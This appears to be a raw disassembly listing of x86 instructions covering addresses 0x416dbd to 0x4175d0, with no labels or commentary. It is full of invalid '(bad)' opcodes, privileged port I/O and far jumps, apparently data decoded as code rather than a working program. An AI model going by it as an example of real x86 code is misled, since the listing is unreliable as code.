  416dbd:	dec    eax
  416dbe:	push   edi
  416dbf:	sbb    al,0xcc
  416dc1:	into   
  416dc2:	std    
  416dc3:	xor    edi,0xc78b76f8
  416dc9:	adc    ecx,DWORD PTR [ecx+0x7ac7583f]
  416dcf:	inc    esp
  416dd0:	gs dec edi
  416dd2:	mov    ds:0x3f8b66b7,eax
  416dd7:	adc    eax,0x30172b1a
  416ddc:	xor    DWORD PTR [eax],esi
  416dde:	add    ecx,DWORD PTR [esi-0x55]
  416de1:	mov    dl,0x48
  416de3:	shl    BYTE PTR [ecx],1
  416de5:	icebp  
  416de6:	aad    0xfd
  416de8:	mov    ecx,DWORD PTR [edx]
  416dea:	dec    ebp
  416deb:	mov    cl,0x81
  416ded:	sub    eax,DWORD PTR ds:0xc9b7e963
  416df3:	inc    eax
  416df4:	dec    ecx
  416df5:	fld    DWORD PTR [eax+0x68f8330c]
  416dfb:	das    
  416dfc:	sbb    cl,BYTE PTR [edx-0x2e]
  416dff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e00:	clc    
  416e01:	push   es
  416e02:	push   0xa4ce61f2
  416e07:	mov    BYTE PTR [ebp-0x27],ah
  416e0a:	gs pop ax
  416e0d:	retf   
  416e0e:	retf   
  416e0f:	or     edi,DWORD PTR [ebp-0x1c707ba9]
  416e15:	cmp    dl,al
  416e17:	mov    ah,BYTE PTR [esi]
  416e19:	jge    0x416e99
  416e1b:	repnz leave 
  416e1d:	jl     0x416e20
  416e1f:	mul    ebp
  416e21:	or     eax,0x504e6f4f
  416e26:	and    bh,BYTE PTR [esi-0x73]
  416e29:	fwait
  416e2a:	and    BYTE PTR [edi+edx*4-0x7d9f2cbf],ch
  416e31:	fsubr  QWORD PTR [ebp+0x1f]
  416e34:	cmp    eax,0x5594f774
  416e39:	outs   dx,BYTE PTR ds:[esi]
  416e3a:	xor    bh,dl
  416e3c:	pop    ds
  416e3d:	mov    edx,0xfadfa96d
  416e42:	jg     0x416e68
  416e44:	in     al,dx
  416e45:	dec    edx
  416e46:	daa    
  416e47:	or     dh,BYTE PTR [ebx]
  416e49:	inc    esp
  416e4a:	icebp  
  416e4b:	pop    esi
  416e4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e4d:	inc    eax
  416e4e:	add    esi,DWORD PTR [eax+0x69]
  416e51:	add    DWORD PTR [esp+eax*8],ebx
  416e54:	repnz bound ebp,QWORD PTR [eax]
  416e57:	ret    0xbc9a
  416e5a:	jge    0x416ec4
  416e5c:	fsub   QWORD PTR [edx]
  416e5e:	sbb    BYTE PTR [edx-0x3e8c12bf],bh
  416e64:	pop    ecx
  416e65:	jecxz  0x416ec7
  416e67:	div    BYTE PTR ds:0x67184dcd
  416e6d:	cmp    BYTE PTR [edx-0x32],bh
  416e70:	or     BYTE PTR [eax+0x12],bl
  416e73:	mov    WORD PTR [ebx],fs
  416e75:	push   edi
  416e76:	bound  ebx,QWORD PTR [eax-0x4e]
  416e79:	nop    esi
  416e7c:	pop    edx
  416e7d:	push   eax
  416e7e:	lods   al,BYTE PTR ds:[esi]
  416e7f:	inc    eax
  416e80:	hlt    
  416e81:	sar    edx,1
  416e83:	cli    
  416e84:	out    dx,eax
  416e85:	mul    ah
  416e87:	and    BYTE PTR [ebx],ah
  416e89:	ret    0xc551
  416e8c:	jmp    0x98a2:0x72842ac7
  416e93:	mov    esi,0xfc8a4dde
  416e98:	push   esp
  416e99:	mov    ch,ah
  416e9b:	pop    ebp
  416e9c:	mov    dh,0x6f
  416e9e:	test   DWORD PTR [esi],0xa0b72ada
  416ea4:	push   esp
  416ea5:	mov    eax,ds:0xd9234d45
  416eaa:	push   ebp
  416eab:	sar    BYTE PTR [edx+edx*4+0x0],0xa7
  416eb0:	cli    
  416eb1:	push   es
  416eb2:	pop    ds
  416eb3:	imul   ecx,DWORD PTR [ebx+0x6d],0x5e
  416eb7:	int    0xc6
  416eb9:	in     al,0x7
  416ebb:	clc    
  416ebc:	shr    DWORD PTR [bp+si-0x1648],1
  416ec1:	cwde   
  416ec2:	pop    ebx
  416ec3:	mov    edx,0x655b39e1
  416ec8:	pop    ecx
  416ec9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416eca:	(bad)  
  416ecb:	leave  
  416ecc:	leave  
  416ecd:	(bad)  
  416ece:	jecxz  0x416e91
  416ed0:	addr16 push ecx
  416ed2:	xor    esi,DWORD PTR [eax-0x25c931a4]
  416ed8:	xor    edx,edi
  416eda:	cmc    
  416edb:	mov    es,WORD PTR [esi]
  416edd:	fs (bad) 
  416edf:	out    0xbc,eax
  416ee1:	jae    0x416e98
  416ee3:	xchg   DWORD PTR [ecx+0x74],esp
  416ee6:	and    dh,bl
  416ee8:	imul   ecx,esi,0xffffffd5
  416eeb:	or     BYTE PTR [edx],ch
  416eed:	(bad)  
  416eee:	xor    BYTE PTR [ebx-0x43],ch
  416ef1:	xchg   edi,eax
  416ef2:	int3   
  416ef3:	call   0x68f5:0xdfbe6b26
  416efa:	push   eax
  416efb:	popa   
  416efc:	out    0x87,al
  416efe:	xchg   esp,eax
  416eff:	stc    
  416f00:	loope  0x416eb8
  416f02:	(bad)  
  416f03:	mov    cl,0x86
  416f05:	add    BYTE PTR [edx],cl
  416f07:	bound  esp,QWORD PTR [ebp-0x14100140]
  416f0d:	in     al,0x14
  416f0f:	into   
  416f10:	pop    esp
  416f11:	inc    esi
  416f12:	push   0xffffff92
  416f14:	(bad)  
  416f15:	fcmovb st,st(1)
  416f17:	into   
  416f18:	icebp  
  416f19:	xchg   esi,ebx
  416f1b:	retf   0x5a49
  416f1e:	mov    ch,0x9a
  416f20:	sbb    eax,0x4b68c386
  416f25:	imul   edi,DWORD PTR [ebp+0x2a24f1fc],0xffffff86
  416f2c:	or     ch,BYTE PTR gs:[esi]
  416f2f:	cli    
  416f30:	and    al,0x72
  416f32:	repnz and eax,0xa3ae1448
  416f38:	fs mov eax,0x97eb5c9e
  416f3e:	enter  0x20ac,0x70
  416f42:	push   ds
  416f43:	aas    
  416f44:	cdq    
  416f45:	in     al,dx
  416f46:	aaa    
  416f47:	scas   eax,DWORD PTR es:[edi]
  416f48:	sbb    al,BYTE PTR [ebx]
  416f4a:	das    
  416f4b:	sbb    esi,0x76
  416f4e:	dec    ebx
  416f4f:	dec    ebx
  416f50:	dec    DWORD PTR [esi]
  416f52:	adc    BYTE PTR [esi+eiz*1+0x64],0xe5
  416f57:	push   0xeabf4946
  416f5c:	(bad)
  416f60:	mov    edi,0x4c00930c
  416f65:	daa    
  416f66:	ror    BYTE PTR [edx],0x15
  416f69:	fist   DWORD PTR [ebx+0x72ada48a]
  416f6f:	sbb    DWORD PTR [ebp+0x96c2c6c],0x32dd8a7
  416f79:	and    DWORD PTR [ebx+0x5c],edx
  416f7c:	jp     0x416f72
  416f7e:	int3   
  416f7f:	enter  0x5572,0x94
  416f83:	pop    es
  416f84:	mov    WORD PTR [eax+0x491726eb],ds
  416f8a:	push   edi
  416f8b:	test   al,0x4d
  416f8d:	and    edi,0xc9f3719a
  416f93:	ins    BYTE PTR es:[edi],dx
  416f94:	mov    ds:0x1b6f98b8,eax
  416f99:	mov    ecx,0xa9ad0a83
  416f9e:	cmc    
  416f9f:	dec    ebp
  416fa0:	rcl    al,1
  416fa2:	mov    ch,dh
  416fa4:	cmp    BYTE PTR [ebx],bh
  416fa6:	xor    cl,cl
  416fa8:	inc    ebx
  416fa9:	mov    al,ds:0x6bbed79c
  416fae:	aam    0x6
  416fb0:	stos   DWORD PTR es:[edi],eax
  416fb1:	mov    al,ds:0x585e98c4
  416fb6:	les    edx,FWORD PTR [esi+0x73]
  416fb9:	sbb    al,0x7c
  416fbb:	mov    ch,0x79
  416fbd:	sahf   
  416fbe:	pop    es
  416fbf:	cmc    
  416fc0:	arpl   WORD PTR [ebp+0x2726b702],cx
  416fc6:	xor    eax,0x93f6df40
  416fcb:	push   ds
  416fcc:	and    DWORD PTR [ecx-0x6491ee4c],edx
  416fd2:	inc    esp
  416fd3:	xor    ah,BYTE PTR [ebp+0x6259ed59]
  416fd9:	lock popf 
  416fdb:	xor    BYTE PTR [ebx-0x2ea4ba03],ah
  416fe1:	mov    al,0xe8
  416fe3:	and    al,0x95
  416fe5:	mov    edi,0xbcf60f2d
  416fea:	push   edi
  416feb:	loope  0x416fb6
  416fed:	mov    ebp,0xa5cf81ce
  416ff2:	add    BYTE PTR [ebx],bh
  416ff4:	test   DWORD PTR [ebp+0x2f],eax
  416ff7:	repz or al,0xc7
  416ffa:	mov    ds:0xe2136d0,al
  416fff:	pop    ss
  417000:	jmp    0x150b:0x7f3187f8
  417007:	enter  0x5f2b,0x7d
  41700b:	arpl   WORD PTR [eax],bx
  41700d:	mov    ds:0xd92f2a76,al
  417012:	push   ss
  417013:	in     eax,dx
  417014:	sub    dl,BYTE PTR ds:0x8bc0bd79
  41701a:	and    esi,DWORD PTR [eax-0x18]
  41701d:	pop    ss
  41701e:	dec    eax
  41701f:	mov    ebx,ss
  417021:	loopne 0x417020
  417023:	imul   esp,DWORD PTR [eax-0x40cb5fa4],0x1f
  41702a:	test   al,0x32
  41702c:	icebp  
  41702d:	fmul   QWORD PTR [ebp+0x10]
  417030:	jae    0x416fc8
  417032:	push   cs
  417033:	sbb    ch,cl
  417035:	cmc    
  417036:	dec    ecx
  417037:	inc    ebp
  417038:	cmp    eax,0x47632039
  41703d:	and    BYTE PTR [esi-0x2113efc0],dh
  417043:	push   edx
  417044:	out    dx,eax
  417045:	jns    0x416fce
  417047:	pop    edi
  417048:	dec    esp
  417049:	add    DWORD PTR [edi-0x66b7da40],ebx
  41704f:	mov    edi,0x3e10cf4c
  417054:	int3   
  417055:	jmp    0x41707e
  417057:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417058:	aaa    
  417059:	jecxz  0x41708f
  41705b:	push   es
  41705c:	inc    edi
  41705d:	xor    BYTE PTR [ecx+0x1a7190eb],bh
  417063:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417064:	mov    ecx,0x7fada270
  417069:	mov    ebp,0xc21e6ea2
  41706e:	dec    esp
  41706f:	jmp    0x8fb5:0x5a968412
  417076:	push   ebp
  417077:	lahf   
  417078:	add    eax,0x8ef86e3f
  41707d:	xchg   ebx,eax
  41707e:	mov    eax,0x9cae0d06
  417083:	mov    ebx,edi
  417085:	in     eax,0x7a
  417087:	xchg   ch,bl
  417089:	cwde   
  41708a:	sbb    bl,BYTE PTR [eax]
  41708c:	mov    esp,0x8c7ea235
  417091:	mov    ebp,esi
  417093:	sub    eax,0x34b42771
  417098:	mov    esp,0x8993f99f
  41709d:	(bad)  
  41709e:	sub    edx,esp
  4170a0:	jo     0x417068
  4170a2:	sbb    BYTE PTR ds:0xadc307aa,dl
  4170a8:	or     al,0xd5
  4170aa:	xor    DWORD PTR [esi-0x42],esi
  4170ad:	dec    eax
  4170ae:	lock fdiv QWORD PTR [ebx]
  4170b1:	aaa    
  4170b2:	bound  edx,QWORD PTR [edx-0x25]
  4170b5:	add    DWORD PTR [ecx+0x7b],0x31f66ba7
  4170bc:	pop    ss
  4170bd:	inc    eax
  4170be:	push   edi
  4170bf:	(bad)  
  4170c0:	fnstcw WORD PTR [ebx+0x12a35345]
  4170c6:	push   ds
  4170c7:	lock pop esi
  4170c9:	mov    ebp,0xb8ff2eaa
  4170ce:	dec    esi
  4170cf:	out    dx,eax
  4170d0:	sub    eax,0xfc46eaad
  4170d5:	stos   BYTE PTR es:[edi],al
  4170d6:	jne    0x417098
  4170d8:	lahf   
  4170d9:	sahf   
  4170da:	gs inc esi
  4170dc:	dec    esp
  4170dd:	jne    0x417129
  4170df:	cli    
  4170e0:	fistp  DWORD PTR [ecx-0x6f]
  4170e3:	xchg   edi,eax
  4170e4:	loopne 0x417068
  4170e6:	push   ds
  4170e7:	call   FWORD PTR [eax+ebp*2+0x72]
  4170eb:	mov    al,ds:0xe9586f8c
  4170f0:	int3   
  4170f1:	lea    eax,[eax-0x44562baf]
  4170f7:	push   0x75
  4170f9:	pop    ebx
  4170fa:	jp     0x4170eb
  4170fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170fd:	enter  0xf4ed,0xc4
  417101:	enter  0xd32f,0x25
  417105:	sbb    al,0xc4
  417107:	bound  edx,QWORD PTR [ecx]
  417109:	xchg   esp,eax
  41710a:	(bad)  
  41710b:	repz mov edx,DWORD PTR [edx+0x77]
  41710f:	jnp    0x417180
  417111:	sub    al,0x87
  417113:	sub    BYTE PTR [edx+0x5],al
  417116:	inc    esi
  417117:	pusha  
  417118:	mov    dl,bh
  41711a:	mov    ds:0xee9efcc,eax
  41711f:	or     edx,DWORD PTR [edi-0x23]
  417122:	pop    es
  417123:	lea    ebp,[ebx]
  417125:	jnp    0x41715b
  417127:	inc    esp
  417128:	xor    esp,DWORD PTR [esi-0x6a]
  41712b:	sub    edi,edx
  41712d:	sbb    cl,bh
  41712f:	push   ss
  417130:	icebp  
  417131:	xlat   BYTE PTR ds:[ebx]
  417132:	pop    ebp
  417133:	idiv   BYTE PTR [edx+0x3f]
  417136:	into   
  417137:	ins    DWORD PTR es:[edi],dx
  417138:	mov    ds:0xc0f31327,al
  41713d:	popa   
  41713e:	(bad)  
  41713f:	dec    eax
  417140:	jl     0x4170dc
  417142:	jne    0x417174
  417144:	retf   0x4c06
  417147:	dec    edx
  417148:	lss    esi,FWORD PTR [ebp-0x1da9733f]
  41714f:	push   es
  417150:	xlat   BYTE PTR ds:[ebx]
  417151:	cmp    DWORD PTR [edi],edx
  417153:	add    eax,ebp
  417155:	test   al,0x9d
  417157:	add    DWORD PTR [ebx+0x78],0x6a
  41715b:	dec    edi
  41715c:	push   ss
  41715d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41715e:	xchg   ecx,eax
  41715f:	cmp    eax,0x76dd53cf
  417164:	adc    bh,dl
  417166:	lock shr DWORD PTR [esi],cl
  417169:	aad    0xc5
  41716b:	outs   dx,BYTE PTR ds:[esi]
  41716c:	sub    eax,0x91401899
  417171:	in     eax,dx
  417172:	scas   eax,DWORD PTR es:[edi]
  417173:	cli    
  417174:	rcr    DWORD PTR [ebx],0x7a
  417177:	pusha  
  417178:	jmp    0x4224bf2c
  41717d:	aas    
  41717e:	adc    al,0x5a
  417180:	inc    eax
  417181:	mov    ds:0xa437d139,al
  417186:	or     eax,0x157ed41e
  41718b:	push   esi
  41718c:	retf   
  41718d:	fstp   QWORD PTR [ebp-0x2f2ae81c]
  417193:	call   0x1ff92a83
  417198:	out    0x7e,al
  41719a:	xchg   edx,edx
  41719c:	cs push 0x35d15da5
  4171a2:	pop    ebx
  4171a3:	inc    edx
  4171a4:	les    ebx,FWORD PTR [ecx-0xe2d40d8]
  4171aa:	loopne 0x417171
  4171ac:	mov    ebp,0x9a48862f
  4171b1:	add    al,0x47
  4171b3:	push   esi
  4171b4:	and    al,0x24
  4171b6:	int    0x78
  4171b8:	mov    fs,WORD PTR [ebx]
  4171ba:	inc    eax
  4171bb:	arpl   WORD PTR [edx+eax*1+0x29],dx
  4171bf:	dec    ebx
  4171c0:	xor    bh,dl
  4171c2:	mov    BYTE PTR [ecx-0x739013b],bh
  4171c8:	push   edi
  4171c9:	inc    edx
  4171ca:	shl    ecx,1
  4171cc:	out    0x73,al
  4171ce:	inc    esp
  4171cf:	arpl   WORD PTR [ebp-0x5e5a259b],bx
  4171d5:	test   DWORD PTR ds:0x723479e7,ebx
  4171db:	jmp    0xd5b02b6e
  4171e0:	test   DWORD PTR [ebp+0x6dc70f15],ebx
  4171e6:	sahf   
  4171e7:	sbb    DWORD PTR [esi],esi
  4171e9:	inc    edx
  4171ea:	scas   eax,DWORD PTR es:[edi]
  4171eb:	jae    0x417249
  4171ed:	xor    al,0xc9
  4171ef:	ffreep st(0)
  4171f1:	xor    eax,0x2a41a123
  4171f6:	lahf   
  4171f7:	mov    al,ds:0xe2d00672
  4171fc:	mov    eax,ds:0x989d9f0c
  417201:	jle    0x417230
  417203:	fnstsw WORD PTR ds:0x80c20a96
  417209:	sub    bl,BYTE PTR [eax]
  41720b:	arpl   WORD PTR [ebp-0x27],di
  41720e:	mov    ebx,0xf10c6ae6
  417213:	inc    esi
  417214:	sti    
  417215:	mov    ebx,DWORD PTR [esp+eax*1]
  417218:	push   esp
  417219:	xor    ch,dl
  41721b:	push   esp
  41721c:	hlt    
  41721d:	cs cli 
  41721f:	lds    edi,FWORD PTR [edi]
  417221:	sbb    eax,edx
  417223:	fwait
  417224:	addr16 mov al,ds:0xff16
  417228:	mov    ds:0x91e10113,eax
  41722d:	push   esp
  41722e:	inc    edx
  41722f:	loopne 0x4171c1
  417231:	aam    0xce
  417233:	cmp    ah,BYTE PTR [ecx]
  417235:	std    
  417236:	es jb  0x4172a8
  417239:	and    esi,edi
  41723b:	sbb    cl,BYTE PTR [ecx+0x9e01926]
  417241:	shl    cl,cl
  417243:	mov    cl,0x1c
  417245:	int3   
  417246:	neg    BYTE PTR [ebp+0x3c1bfaad]
  41724c:	mov    eax,edx
  41724e:	lea    esp,[edx+0x7195638c]
  417254:	ja     0x417252
  417256:	cwde   
  417257:	mov    bh,0xa6
  417259:	add    bl,ch
  41725b:	xchg   DWORD PTR [esi],esp
  41725d:	adc    eax,0xc6d520ed
  417262:	cmp    al,0xcc
  417264:	in     al,dx
  417265:	cdq    
  417266:	pusha  
  417267:	jle    0x4172d2
  417269:	mov    bh,0xc8
  41726b:	dec    eax
  41726c:	jmp    0xee587099
  417271:	and    eax,0x4ccba974
  417276:	pop    esp
  417277:	sti    
  417278:	adc    DWORD PTR [esi-0x32],edi
  41727b:	and    BYTE PTR [esi-0x3d97bb69],bl
  417281:	int3   
  417282:	int3   
  417283:	mov    ebx,0xba992622
  417288:	retf   0x58c7
  41728b:	adc    al,0xe9
  41728d:	xchg   DWORD PTR ds:0x56a19062,esi
  417293:	jg     0x417297
  417295:	xor    esp,ebp
  417297:	out    dx,eax
  417298:	cmp    eax,0xd84110ba
  41729d:	outs   dx,BYTE PTR ds:[esi]
  41729e:	lea    eax,[edx-0x5f5859d7]
  4172a4:	sub    DWORD PTR [ebx-0x329a25f6],esp
  4172aa:	retf   
  4172ab:	fcom   QWORD PTR [ebx-0x597b4ac]
  4172b1:	stos   DWORD PTR es:[edi],eax
  4172b2:	push   ebx
  4172b3:	adc    edx,eax
  4172b5:	aam    0xe7
  4172b7:	inc    edi
  4172b8:	mov    dl,0x2d
  4172ba:	jp     0x4172a9
  4172bc:	fsubr  st(1),st
  4172be:	in     eax,dx
  4172bf:	pop    esp
  4172c0:	push   ss
  4172c1:	shl    DWORD PTR [ebp+0xcc0973a],0xbc
  4172c8:	jae    0x4172a2
  4172ca:	idiv   DWORD PTR [ebx-0x28]
  4172cd:	ret    0x5dc2
  4172d0:	cmp    DWORD PTR [edi-0x2055c079],ecx
  4172d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172d7:	call   0x3802492e
  4172dc:	out    dx,al
  4172dd:	dec    esp
  4172de:	arpl   bx,ax
  4172e0:	inc    ebx
  4172e1:	mov    ecx,0x535e4576
  4172e6:	pop    ss
  4172e7:	add    al,0x40
  4172e9:	cmp    eax,0x11e154d7
  4172ee:	scas   al,BYTE PTR es:[edi]
  4172ef:	(bad)  
  4172f0:	pop    ds
  4172f1:	ret    0x7923
  4172f4:	stc    
  4172f5:	mov    eax,ds:0x1c9ce15a
  4172fa:	test   DWORD PTR [eax],0xb3b177f8
  417300:	push   ds
  417301:	sub    ecx,esi
  417303:	lock ret 
  417305:	push   edx
  417306:	cdq    
  417307:	xor    eax,0x101045d7
  41730c:	jmp    0x23a2:0x720ec399
  417313:	iret   
  417314:	cmc    
  417315:	jmp    0x417308
  417317:	mov    dh,0x84
  417319:	jno    0x4172ea
  41731b:	jle    0x417394
  41731d:	mov    al,BYTE PTR [ebx+0xd]
  417320:	cmp    ecx,0x19cfc9f6
  417326:	mov    ebp,0x77fc2ac8
  41732b:	adc    BYTE PTR [ecx],0x11
  41732e:	inc    ecx
  41732f:	in     al,dx
  417330:	loope  0x4172c7
  417332:	mov    edx,0x2933fba4
  417337:	jns    0x4172db
  417339:	xchg   esp,eax
  41733a:	neg    BYTE PTR [ecx+eax*4]
  41733d:	lock jno 0x41738f
  417340:	fidiv  DWORD PTR [esi+0x38]
  417343:	push   eax
  417344:	xchg   edi,eax
  417345:	popa   
  417346:	sbb    ebx,DWORD PTR [edi-0x629ea71d]
  41734c:	mov    ecx,0x1b8c1d53
  417351:	pop    ebp
  417352:	inc    ebx
  417353:	outs   dx,BYTE PTR ds:[esi]
  417354:	xchg   ebp,eax
  417355:	dec    esp
  417356:	lods   al,BYTE PTR ds:[esi]
  417357:	add    ah,0x2
  41735a:	lea    eax,[eax-0x12c43bf0]
  417360:	pop    ss
  417361:	dec    edi
  417362:	call   esi
  417364:	jl     0x4173d2
  417366:	fwait
  417367:	loope  0x41734d
  417369:	std    
  41736a:	sbb    al,0x51
  41736c:	push   esi
  41736d:	(bad)  
  41736e:	jecxz  0x417343
  417370:	shr    DWORD PTR [eax-0x7a4cf786],0xf6
  417377:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417379:	lods   eax,DWORD PTR ds:[esi]
  41737b:	je     0x417319
  41737d:	in     al,0x5c
  41737f:	outs   dx,BYTE PTR ds:[esi]
  417380:	sub    DWORD PTR [eax-0x1f6fcdcb],0x540cb72d
  41738a:	sub    esp,DWORD PTR [ecx+ecx*8-0x5b56f4e9]
  417391:	pmuludq mm6,QWORD PTR ds:0x61460c13
  417398:	out    dx,eax
  417399:	dec    ebx
  41739a:	cli    
  41739b:	out    0x48,al
  41739d:	sub    dh,BYTE PTR [eax+0x68]
  4173a0:	xchg   esi,eax
  4173a1:	fsubr  QWORD PTR [esi-0x29295771]
  4173a7:	inc    ecx
  4173a8:	fmul   DWORD PTR [ebp+ebp*8+0x59]
  4173ac:	jmp    0xcc7c:0x96a4374d
  4173b3:	into   
  4173b4:	(bad)  
  4173b6:	lods   eax,DWORD PTR ds:[esi]
  4173b7:	sbb    esp,ebp
  4173b9:	stos   DWORD PTR es:[edi],eax
  4173ba:	aas    
  4173bb:	jle    0x4173f2
  4173bd:	pop    ds
  4173be:	jnp    0x4173c0
  4173c0:	mov    bh,0xb9
  4173c2:	xchg   ecx,eax
  4173c3:	add    eax,0x73ba5f44
  4173c8:	inc    ebp
  4173c9:	iret   
  4173ca:	sbb    cl,bl
  4173cc:	mov    ebx,0x5c4489ed
  4173d1:	stos   BYTE PTR es:[edi],al
  4173d2:	jne    0x4173d2
  4173d4:	das    
  4173d5:	jo     0x41741f
  4173d7:	cdq    
  4173d8:	dec    ebx
  4173d9:	dec    eax
  4173da:	sub    bh,bh
  4173dc:	clc    
  4173dd:	out    0x65,al
  4173df:	cs test al,0x95
  4173e2:	or     al,0x21
  4173e4:	mov    esp,0xf182a381
  4173e9:	add    BYTE PTR [ebp-0x5ec542ac],dl
  4173ef:	or     DWORD PTR [eax-0x1b],0x944821ed
  4173f6:	mov    cl,0x72
  4173f8:	cmp    DWORD PTR [eax-0x97c8958],ecx
  4173fe:	adc    esi,DWORD PTR [eax-0x53b55d3a]
  417404:	shr    BYTE PTR [ebp-0x80],0xf
  417408:	lods   eax,DWORD PTR ds:[esi]
  417409:	cs push esi
  41740b:	inc    edi
  41740c:	lds    edi,FWORD PTR gs:[ebp+ecx*8+0x5d5c4747]
  417414:	push   ebp
  417415:	mov    edx,0x3d17f670
  41741a:	cmp    eax,DWORD PTR [edx+ebx*1]
  41741d:	or     eax,0x77481871
  417422:	pop    ebx
  417423:	mov    ebp,0x44ae6bbf
  417428:	enter  0x7286,0x41
  41742c:	aam    0x6c
  41742e:	mov    dh,0xeb
  417430:	data16 ja 0x417417
  417433:	mov    eax,0xac80e1b5
  417438:	aaa    
  417439:	mov    ecx,0x500738aa
  41743e:	addr16 mov ds:0x8020,eax
  417442:	xor    ebx,DWORD PTR [edx+0x39]
  417445:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417446:	mov    WORD PTR [ebp-0x15],gs
  417449:	add    al,0x7
  41744b:	push   ecx
  41744c:	sti    
  41744d:	mov    edi,edx
  41744f:	enter  0x2957,0xde
  417453:	imul   esp,DWORD PTR [ecx+0x27],0xfa3adcfa
  41745a:	add    ah,BYTE PTR [edx+0x430d61ec]
  417460:	push   eax
  417461:	dec    edi
  417462:	xor    eax,0x29a16d37
  417467:	imul   esp,DWORD PTR [eax+0x43ac54d3],0x5d89759b
  417471:	nop
  417472:	pop    edx
  417473:	push   esi
  417474:	retf   0x2838
  417477:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417478:	pop    esp
  417479:	mov    edx,0x6522626f
  41747e:	or     cl,BYTE PTR [eax-0x14]
  417481:	call   0xf257:0xc612928f
  417488:	adc    al,BYTE PTR [ebp+ebp*2+0x78a0a1ad]
  41748f:	mov    ds:0x2c633d2a,eax
  417494:	inc    esp
  417495:	in     al,dx
  417496:	inc    ecx
  417497:	pop    eax
  417498:	add    esp,DWORD PTR [ebx+0x15bf8378]
  41749e:	imul   BYTE PTR [eax+0x1fbfe55c]
  4174a4:	fst    QWORD PTR [eax]
  4174a6:	daa    
  4174a7:	aaa    
  4174a8:	(bad)  
  4174a9:	push   0xffffffbe
  4174ab:	cdq    
  4174ac:	mov    ecx,0x5bf0e56f
  4174b1:	pop    esi
  4174b2:	jb     0x417470
  4174b4:	rol    BYTE PTR [esi+0x7aa23ba9],cl
  4174ba:	push   es
  4174bb:	mov    DWORD PTR fs:[eax-0x62ea730d],esp
  4174c2:	push   edx
  4174c3:	(bad)  
  4174c4:	cmp    ecx,DWORD PTR [edx+edx*1+0x5813bd78]
  4174cb:	jbe    0x417519
  4174cd:	nop
  4174ce:	add    eax,0xb6933080
  4174d3:	adc    al,0xef
  4174d5:	push   edx
  4174d6:	arpl   WORD PTR [edx],bx
  4174d8:	cld    
  4174d9:	jnp    0x417473
  4174db:	xor    esp,ebx
  4174dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174de:	pop    eax
  4174df:	das    
  4174e0:	pop    ss
  4174e1:	ficom  WORD PTR [edi-0x397842a6]
  4174e7:	sub    DWORD PTR [ebp+eiz*8-0x41],0xffffffb9
  4174ec:	sbb    al,0x3e
  4174ee:	mov    bh,0xcc
  4174f0:	addr16 mov ch,0xfa
  4174f3:	jp     0x4174f5
  4174f5:	sub    BYTE PTR [edi],dh
  4174f7:	sbb    bl,BYTE PTR [edi-0x9]
  4174fa:	std    
  4174fb:	loope  0x417487
  4174fd:	clc    
  4174fe:	fstp   QWORD PTR [ebp+eax*2-0x48e7ed33]
  417505:	and    al,BYTE PTR [eax*8+0x538f7e77]
  41750c:	dec    ebx
  41750d:	sar    DWORD PTR [edi+0x13],1
  417510:	mov    eax,ds:0x6bf815cc
  417515:	mov    ah,0xad
  417517:	mov    ah,0x63
  417519:	arpl   WORD PTR [eax-0x2a],si
  41751c:	inc    edx
  41751d:	cmp    al,0x79
  41751f:	cmc    
  417520:	enter  0x5357,0x12
  417524:	mov    eax,ds:0xa4a322ad
  417529:	hlt    
  41752a:	outs   dx,DWORD PTR ds:[esi]
  41752b:	lods   al,BYTE PTR ds:[esi]
  41752c:	or     eax,0x791e52e2
  417531:	sti    
  417532:	arpl   WORD PTR [edx-0x655ae721],bp
  417538:	xor    eax,0xace5c81c
  41753d:	das    
  41753e:	fidiv  DWORD PTR [esi]
  417540:	loopne 0x4174f5
  417542:	adc    BYTE PTR [eax],0x7d
  417545:	jbe    0x417514
  417547:	adc    cl,ch
  417549:	gs rol cl,0xdd
  41754d:	lea    ebx,[eax]
  41754f:	stc    
  417550:	push   esi
  417551:	mov    eax,ds:0xfb0ce082
  417556:	pop    ds
  417557:	adc    dl,BYTE PTR [esi+0x29db423d]
  41755d:	jp     0x41757f
  41755f:	data16 jnp 0x417511
  417562:	out    dx,al
  417563:	pop    ebx
  417564:	or     al,0xb5
  417566:	aas    
  417567:	mov    al,ds:0xf0c1b610
  41756c:	stos   BYTE PTR es:[edi],al
  41756d:	push   esi
  41756e:	xor    bh,BYTE PTR [ebx]
  417570:	je     0x41759d
  417572:	mov    ds:0x1e30efde,al
  417577:	ret    
  417578:	add    eax,0xc7e115ad
  41757d:	cmp    al,0xcb
  41757f:	inc    ebx
  417580:	push   0x68b40ca9
  417585:	pop    esi
  417586:	ins    BYTE PTR es:[edi],dx
  417587:	push   ebp
  417588:	jmp    0xf9c1414f
  41758d:	in     al,dx
  41758e:	mov    ds:0x6db1eda7,al
  417593:	imul   esp,DWORD PTR [esi-0x740b7b7a],0xffffff94
  41759a:	dec    ebx
  41759b:	jp     0x417569
  41759d:	mov    bl,0x3b
  41759f:	xor    ah,dl
  4175a1:	cmp    dh,BYTE PTR [ebx+0x163ab388]
  4175a7:	popa   
  4175a8:	out    0xe2,eax
  4175aa:	int3   
  4175ab:	loop   0x417549
  4175ad:	das    
  4175ae:	dec    esp
  4175b0:	jg     0x417599
  4175b2:	pusha  
  4175b3:	ds push edx
  4175b5:	adc    eax,DWORD PTR [ecx-0x74]
  4175b8:	jmp    0xba8d7252
  4175bd:	inc    ebp
  4175be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175bf:	data16 mov bl,0x9b
  4175c2:	push   ss
  4175c3:	ins    BYTE PTR es:[edi],dx
  4175c4:	push   ecx
  4175c5:	(bad)  
  4175c6:	jl     0x4175a1
  4175c8:	sti    
  4175c9:	xor    eax,0xa6e8eefd
  4175ce:	(bad)  
  4175cf:	scas   eax,DWORD PTR es:[edi]
  4175d0:	arpl   WORD PTR [edi-0x4b],di
